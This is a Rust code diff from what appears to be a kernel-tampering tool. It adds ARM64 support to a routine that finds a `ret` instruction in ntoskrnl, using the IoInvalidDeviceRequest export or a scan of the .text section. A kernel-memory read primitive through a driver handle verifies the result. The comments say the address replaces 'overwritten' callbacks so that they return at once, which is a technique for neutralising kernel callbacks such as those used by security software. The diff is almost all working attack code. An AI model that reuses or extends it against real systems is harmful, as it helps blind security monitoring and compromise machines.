@@ -116,12 +116,15 @@ pub struct RestoreResult {
     pub failed: usize,
 }
 
-/// Resolve the address of `IoInvalidDeviceRequest` in ntoskrnl.
+/// Resolve the address of a `ret` gadget in ntoskrnl.
 ///
-/// `IoInvalidDeviceRequest` is a simple `ret` instruction (0xC3) in
-/// ntoskrnl.exe. It's the default IRP dispatch function and is always
-/// present. Using this address ensures the overwritten callback returns
-/// immediately with STATUS_INVALID_DEVICE_REQUEST.
+/// `IoInvalidDeviceRequest` is a simple `ret` instruction in ntoskrnl.exe.
+/// It's the default IRP dispatch function and is always present. Using this
+/// address ensures the overwritten callback returns immediately with
+/// STATUS_INVALID_DEVICE_REQUEST.
+///
+/// On x86-64 the instruction is a single byte `0xC3`.  On ARM64 it is a
+/// four-byte encoding `0xD65F03C0` (`br x30` / `ret`).
 ///
 /// Falls back to scanning the .text section for any `ret` instruction
 /// if the export cannot be resolved.
@@ -131,6 +134,11 @@ fn find_ret_address(
     kernel_base: u64,
     cr3: Option<u64>,
 ) -> Result<u64> {
+    // Arch-specific ret encoding.
+    //
+    // x86-64: `ret` = 0xC3 (1 byte)
+    // ARM64:  `ret` = 0xD65F03C0 (4 bytes, little-endian: C0 03 5F D6)
+
     // Method 1: Resolve IoInvalidDeviceRequest export.
     // This function is literally just `ret` and is present in all Windows versions.
     match super::discover::resolve_kernel_symbol(
@@ -141,24 +149,49 @@ fn find_ret_address(
     ) {
         Ok(addr) => {
             // Verify it's actually a ret instruction.
-            let mut buf = [0u8; 1];
-            match unsafe { read_kernel_memory(driver, device_handle, cr3, addr, &mut buf) } {
-                Ok(()) if buf[0] == 0xC3 => {
-                    log::info!("Found ret at IoInvalidDeviceRequest: 0x{:016X}", addr);
-                    return Ok(addr);
+            #[cfg(target_arch = "x86_64")]
+            {
+                let mut buf = [0u8; 1];
+                match unsafe { read_kernel_memory(driver, device_handle, cr3, addr, &mut buf) } {
+                    Ok(()) if buf[0] == 0xC3 => {
+                        log::info!("Found ret at IoInvalidDeviceRequest: 0x{:016X}", addr);
+                        return Ok(addr);
+                    }
+                    Ok(()) => {
+                        log::warn!(
+                            "IoInvalidDeviceRequest at 0x{:016X} is not ret (0x{:02X}), scanning .text",
+                            addr, buf[0]
+                        );
+                    }
+                    Err(e) => {
+                        log::warn!(
+                            "Failed to verify IoInvalidDeviceRequest: {}, scanning .text",
+                            e
+                        );
+                    }
                 }
-                Ok(()) => {
-                    log::warn!(
-                        "IoInvalidDeviceRequest at 0x{:016X} is not ret (0x{:02X}), scanning .text",
-                        addr,
-                        buf[0]
-                    );
-                }
-                Err(e) => {
-                    log::warn!(
-                        "Failed to verify IoInvalidDeviceRequest: {}, scanning .text",
-                        e
-                    );
+            }
+            #[cfg(target_arch = "aarch64")]
+            {
+                let mut buf = [0u8; 4];
+                match unsafe { read_kernel_memory(driver, device_handle, cr3, addr, &mut buf) } {
+                    Ok(()) if u32::from_le_bytes(buf) == 0xD65F03C0 => {
+                        log::info!("Found ret at IoInvalidDeviceRequest: 0x{:016X}", addr);
+                        return Ok(addr);
+                    }
+                    Ok(()) => {
+                        log::warn!(
+                            "IoInvalidDeviceRequest at 0x{:016X} is not ret (0x{:08X}), scanning .text",
+                            addr,
+                            u32::from_le_bytes(buf)
+                        );
+                    }
+                    Err(e) => {
+                        log::warn!(
+                            "Failed to verify IoInvalidDeviceRequest: {}, scanning .text",
+                            e
+                        );
+                    }
                 }
             }
         }
@@ -236,7 +269,7 @@ fn find_ret_address(
         let virtual_size = u32::from_le_bytes(section_header[8..12].try_into()?) as u64;
         let virtual_address = u32::from_le_bytes(section_header[12..16].try_into()?) as u64;
 
-        // Scan the first 4KB of .text for a ret (0xC3) byte.
+        // Scan the first 4KB of .text for a ret instruction.
         // Pick one at a random-ish offset to avoid determinism.
         let scan_size = std::cmp::min(4096u64, virtual_size);
         let mut scan_buf = vec![0u8; scan_size as usize];
@@ -250,30 +283,68 @@ fn find_ret_address(
             )?;
         }
 
-        // Find a ret instruction. Prefer ones at 16-byte aligned offsets
-        // (function entry points are typically aligned).
-        for offset in (0..scan_size).step_by(16) {
-            if scan_buf[offset as usize] == 0xC3 {
-                let ret_addr = kernel_base + virtual_address + offset;
-                log::info!(
-                    "Found ret in .text at offset 0x{:04X}: 0x{:016X}",
-                    offset,
-                    ret_addr
-                );
-                return Ok(ret_addr);
+        // Arch-specific .text ret scan.
+        //
+        // x86-64: look for single byte 0xC3.
+        // ARM64:  look for 4-byte u32 0xD65F03C0 at 4-byte aligned offsets.
+        #[cfg(target_arch = "x86_64")]
+        {
+            // Find a ret instruction. Prefer ones at 16-byte aligned offsets
+            // (function entry points are typically aligned).
+            for offset in (0..scan_size).step_by(16) {
+                if scan_buf[offset as usize] == 0xC3 {
+                    let ret_addr = kernel_base + virtual_address + offset;
+                    log::info!(
+                        "Found ret in .text at offset 0x{:04X}: 0x{:016X}",
+                        offset,
+                        ret_addr
+                    );
+                    return Ok(ret_addr);
+                }
+            }
+
+            // If no aligned ret found, try any offset.
+            for (offset, &byte) in scan_buf.iter().enumerate() {
+                if byte == 0xC3 {
+                    let ret_addr = kernel_base + virtual_address + offset as u64;
+                    log::info!(
+                        "Found ret in .text at unaligned offset 0x{:04X}: 0x{:016X}",
+                        offset,
+                        ret_addr
+                    );
+                    return Ok(ret_addr);
+                }
             }
         }
+        #[cfg(target_arch = "aarch64")]
+        {
+            let ret_bytes: u32 = 0xD65F03C0;
+            // Prefer 16-byte aligned offsets (function entry alignment on ARM64).
+            for offset in (0..scan_size.saturating_sub(4)).step_by(16) {
+                let off = offset as usize;
+                if u32::from_le_bytes([scan_buf[off], scan_buf[off + 1], scan_buf[off + 2], scan_buf[off + 3]]) == ret_bytes {
+                    let ret_addr = kernel_base + virtual_address + offset;
+                    log::info!(
+                        "Found ret in .text at offset 0x{:04X}: 0x{:016X}",
+                        offset,
+                        ret_addr
+                    );
+                    return Ok(ret_addr);
+                }
+            }
 
-        // If no aligned ret found, try any offset.
-        for (offset, &byte) in scan_buf.iter().enumerate() {
-            if byte == 0xC3 {
-                let ret_addr = kernel_base + virtual_address + offset as u64;
-                log::info!(
-                    "Found ret in .text at unaligned offset 0x{:04X}: 0x{:016X}",
-                    offset,
-                    ret_addr
-                );
-                return Ok(ret_addr);
+            // Fallback: scan at 4-byte aligned offsets.
+            for offset in (0..scan_size.saturating_sub(4)).step_by(4) {
+                let off = offset as usize;
+                if u32::from_le_bytes([scan_buf[off], scan_buf[off + 1], scan_buf[off + 2], scan_buf[off + 3]]) == ret_bytes {
+                    let ret_addr = kernel_base + virtual_address + offset;
+                    log::info!(
+                        "Found ret in .text at 4-byte aligned offset 0x{:04X}: 0x{:016X}",
+                        offset,
+                        ret_addr
+                    );
+                    return Ok(ret_addr);
+                }
             }
         }
     }
